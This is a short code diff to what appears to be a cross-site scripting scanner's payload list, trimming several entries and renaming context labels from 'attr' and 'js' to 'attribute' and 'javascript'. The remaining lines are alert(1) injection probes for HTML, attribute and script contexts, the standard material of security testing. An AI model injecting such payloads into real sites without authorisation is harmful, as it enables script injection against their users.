@@ -2,17 +2,14 @@ from core.payloads.base import Payload
 
 HTML_PAYLOADS = [
     Payload("<script>alert(1)</script>", "html"),
-    Payload("<svg/onload=alert(1)>", "html"),
 ]
 
 ATTR_PAYLOADS = [
-    Payload("\" onmouseover=alert(1) x=\"", "attr"),
-    Payload("' autofocus onfocus=alert(1) '", "attr"),
+    Payload("\" onmouseover=alert(1) x=\"", "attribute"),
 ]
 
 JS_PAYLOADS = [
-    Payload("';alert(1);//", "js"),
-    Payload("alert(1)", "js"),
+    Payload("';alert(1);//", "javascript"),
 ]
 
 URL_PAYLOADS = [
